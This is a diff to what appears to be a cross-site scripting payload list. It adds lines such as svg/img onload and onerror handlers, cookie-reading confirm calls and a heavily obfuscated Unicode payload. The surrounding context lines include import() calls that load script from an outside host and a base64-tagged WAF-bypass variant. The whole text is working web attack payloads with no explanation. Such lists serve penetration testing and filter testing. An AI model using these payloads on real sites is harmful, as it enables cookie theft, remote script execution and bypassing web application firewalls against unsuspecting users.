@@ -3,8 +3,14 @@
 013371337;ext=<img/src/onerror=import('//domain/')>
 "><img/src/onerror=import('//domain/')>"
 <Svg Only=1 OnLoad=confirm(document.domain)>
+'"><svg/onload=prompt(5);>{{7*7}}
+?w="onmouseover=alert(document.domain)//
+?s="onmouseover=alert(document.domain)//
+"onmouseover=alert(document.domain)//
 <Svg/OnLoad=alert(1337)>"@gmail.com
+<Img Src=OnXSS OnError=confirm(document.cookie)>
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+"><img/src=x onerror="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(document.domain)')()"
 <svg onload=alert&#0000000040document.cookie)>
 <svg onload=alert&#0000000040"1")><””>
 <Img Src=//X55.is OnLoad%0C=import(Src)>
